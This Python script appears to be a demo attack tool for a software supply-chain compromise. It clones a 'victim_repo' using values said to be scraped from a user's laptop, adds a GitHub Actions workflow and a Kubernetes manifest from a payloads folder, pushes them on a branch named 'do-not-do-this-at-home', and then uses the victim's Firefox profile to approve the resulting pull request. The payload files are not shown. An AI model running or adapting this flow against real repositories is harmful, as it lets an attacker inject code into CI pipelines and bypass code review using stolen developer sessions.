import os,sys
import pathlib
import yaml
import logging
from pprint import pprint
import subprocess
import shutil


from lib.browser import *

script_directory = pathlib.Path(__file__).parent
payload_directory= script_directory / "payloads" 


def get_value_from_user_laptop() -> dict:
    #fake implementation
    logging.info("Scraping informations from local enviroment")
    with open(f'{script_directory}/local_values/locals.yml', 'r') as file:
        local_values = yaml.safe_load(file)
        return local_values

def create_folder_if_not_exists(folder_path):
    folder = pathlib.Path(folder_path)
    if not folder.exists():
        folder.mkdir(parents=True)
        logging.info(f"Folder '{folder_path}' created.")
    else:
        logging.info(f"Folder '{folder_path}' already exists.")

def remove_folder_if_exists(folder_path):
    if os.path.exists(folder_path):
    # Remove the folder and all its contents
        shutil.rmtree(folder_path)
        print(f"The folder '{folder_path}' has been removed.")
    else:
        print(f"The folder '{folder_path}' does not exist.")

def read_and_write_file(read_path, write_path):
    # Read the file into a string
    with open(read_path, 'r') as file:
        file_contents = file.read()
    
    # Write the string to another file, creating or overwriting it
    with open(write_path, 'w') as file:
        file.write(file_contents)
    logging.info(f"Contents from {read_path} have been successfully written to {write_path}")


def command_in_folder(command:dict,folder_path):
    # logging.info(f"The current working directory is: {os.getcwd()}")
    try:
        result = subprocess.run(command, cwd=folder_path, check=True, text=True, capture_output=True)
        logging.info(f"Success executing {command}  in {folder_path}")
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        logging.info(f"Error executing {command}  in {folder_path}")
        print(e.output)

def demo_1_step_2(local_values:dict):
    local_values=local_values["found_values"]
    repo=local_values["repo"]
    pr_title=local_values["pr_title"]
    browser_profile_path=local_values["browser_profile_path"]
    approve_request_firefox(browser_profile_path=browser_profile_path,repo=repo,pr_title=pr_title)

def create_pr_demo1_changes(target_folder="/tmp/victim_repo"):
    action_name="create_pr.yml"
    target_action_folder=f"{target_folder}/.github/workflows"
    target_action_path=f"{target_action_folder}/{action_name}"
    source_action_path=f"{payload_directory}/actions/{action_name}"
    
    
    source_app_apth=f"{payload_directory}/patches/web-app1.yaml"
    target_app_folder=f"{target_folder}/k8s/web-app"
    target_app_path=f"{target_app_folder}/web-app1.yaml"

    logging.info(f"creating folder {target_action_folder}")
    create_folder_if_not_exists(target_action_folder)
    logging.info(f"creating folder {target_app_folder}")
    create_folder_if_not_exists(target_app_folder)    

    logging.info(f"copying {source_action_path} into {target_action_path}")
    read_and_write_file(source_action_path,target_action_path)

    logging.info(f"copying {source_app_apth} into {target_app_path}")
    read_and_write_file(source_app_apth,target_app_path)


def demo_1_step_1(local_values:dict,target_folder="/tmp/victim_repo"):
    remove_folder_if_exists(target_folder)
    #clone repo in temp dir
    local_values=local_values["found_values"]
    repo=local_values["repo"]
    git_connection=local_values["git_connection"]
    git_url_connection=f"{git_connection}:{repo}.git"


    logging.info(f"Cloning repo {git_url_connection}")
    if not os.path.exists(target_folder):
        subprocess.run(['git', 'clone', git_url_connection,target_folder], check=True)

    commands=[
        ['git', 'fetch', 'origin'],
        ['git', 'checkout', 'main'],
        ['git', 'reset', '--hard', 'origin/main'],
        ['git', 'clean', '-fd'],
        ["git","branch","do-not-do-this-at-home"],
        ["git","checkout","do-not-do-this-at-home"],
        ["git","merge","main"],
        ["git","pull"]
    ]

    for command in commands:
        command_in_folder(command,target_folder)

    #make changes

    create_pr_demo1_changes()

    #push changes

    commands=[
        ["git","add","."],
        ["git","commit", "-m", "Doing Stuff I should not be doing"],
        ["git","push", "--set-upstream","origin","do-not-do-this-at-home"],
        ["git","push"]
    ]
   
    for command in commands:
        command_in_folder(command,target_folder)
    

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG,format='%(asctime)s - %(levelname)s - %(message)s')
    local_values=get_value_from_user_laptop()
    command=None

    functions_dict = {
        "demo-1-step-1": demo_1_step_1,
        "demo-1-step-2": demo_1_step_2
    }

    try:
        command=sys.argv[1]
        functions_dict[command](local_values)
    except Exception as e: 
        print(f"An exception occurred: {type(e).__name__}, {e}")
        logging.info("Command domino not recognised")
